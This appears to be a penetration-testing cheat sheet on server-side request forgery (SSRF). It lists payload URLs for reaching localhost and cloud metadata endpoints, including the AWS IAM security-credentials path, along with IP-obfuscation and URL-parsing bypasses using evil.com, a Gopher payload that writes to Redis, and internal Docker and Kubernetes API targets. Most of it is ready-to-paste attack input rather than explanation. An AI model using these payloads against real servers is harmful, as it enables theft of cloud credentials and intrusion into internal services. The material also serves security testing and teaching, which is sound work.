## 📌 1. What is SSRF (Advanced Definition)

**SSRF** occurs when an attacker can control or manipulate the server’s HTTP requests. Instead of the server fetching remote content securely, it is tricked into:

- Accessing **internal networks**
    
- Hitting **localhost services**
    
- Interacting with **cloud provider metadata endpoints**
    
- Scanning ports
    
- Sending arbitrary requests to arbitrary destinations
    

The vulnerability exists because the server **trusts itself**, so internal services that are otherwise protected can become accessible.

---

## 🧩 2. SSRF Variants

| Type                        | Description                                                           |
| --------------------------- | --------------------------------------------------------------------- |
| **Basic SSRF**              | Attacker controls URL or request endpoint directly                    |
| **Blind SSRF**              | No response is shown to attacker; requires OAST/interactions          |
| **Out-of-Band SSRF**        | Requires DNS logging, Collaborator, or Burp Suite Repeater            |
| **Second-order SSRF**       | Input is stored and used in a future server-side request              |
| **SSRF to RCE**             | SSRF used to reach internal services like Redis, Gopher, etc. for RCE |
| **Protocol Smuggling SSRF** | Using FTP, Gopher, or file:// to escalate exploitation                |

---

## 🧪 3. Advanced SSRF Payloads

### 🔹 Internal IP Access

`http://127.0.0.1/ http://localhost:80/ http://0x7f000001/ http://2130706433/ http://[::1]/`

### 🔹 Cloud Metadata Endpoints

#### AWS:

ruby
`http://169.254.169.254/latest/meta-data/ http://169.254.169.254/latest/meta-data/iam/security-credentials/`

#### GCP:

bash
`http://metadata.google.internal/computeMetadata/v1/instance/`

#### Azure:

arduino

`http://169.254.169.254/metadata/instance?api-version=2021-02-01`

_Use required headers like `Metadata: true` for Azure & GCP_

---

## 🎯 4. Bypass Techniques (Advanced)

### 🧨 IP Obfuscation

`127.0.0.1        → Decimal: 2130706433                  → Hex: 0x7f000001                  → Octal: 0177.0.0.1`

### 🧨 DNS Rebinding

Use an attacker-controlled DNS to resolve to internal IP:
`attacker.evil.com → 127.0.0.1 (via manipulated DNS)`

### 🧨 URL Parsing Bugs
`http://127.0.0.1@evil.com
`http://evil.com#@127.0.0.1`
`http://127.0.0.1%09.evil.com`
### 🧨 Redirect Chains
`http://trusted.com/redirect?url=http://internal/`

---

## 💣 5. SSRF to RCE & Privilege Escalation

### 🔥 Targeting Internal Services

- **Redis** (write crontab or SSH key)
    
- **Elasticsearch** (scripts)
    
- **MongoDB** (internal API exposure)
    
- **Docker APIs** (`http://localhost:2375/containers/json`)
    
- **Kubernetes API** (`http://localhost:8001` or cloud metadata for kube tokens)
    

### 🔥 Gopher Protocol (RCE)

Gopher can allow sending **custom binary payloads**, often to internal services like Redis:

`gopher://127.0.0.1:6379/_%0D%0ASET%20mykey%20evilvalue%0D%0A`

---

## 📷 6. Blind SSRF Detection Techniques

- **Burp Collaborator** / **Interactsh**
    
- DNS logging platforms like:
    
    - `dnslog.cn`
        
    - `requestbin`
        
    - `webhook.site`
        
- Log monitoring (cloud logs, WAF logs)
    
- Timing attacks: if the endpoint delays = request likely went through
    

---

## ⚙️ 7. Automation Tools for SSRF

| Tool             | Description                            |
| ---------------- | -------------------------------------- |
| **SSRFmap**      | Automates SSRF against common services |
| **Gopherus**     | Generates Gopher payloads              |
| **Burp Suite**   | Use Collaborator and repeater          |
| **Interactsh**   | OOB testing                            |
| **ffuf / wfuzz** | Fuzz SSRF parameters                   |
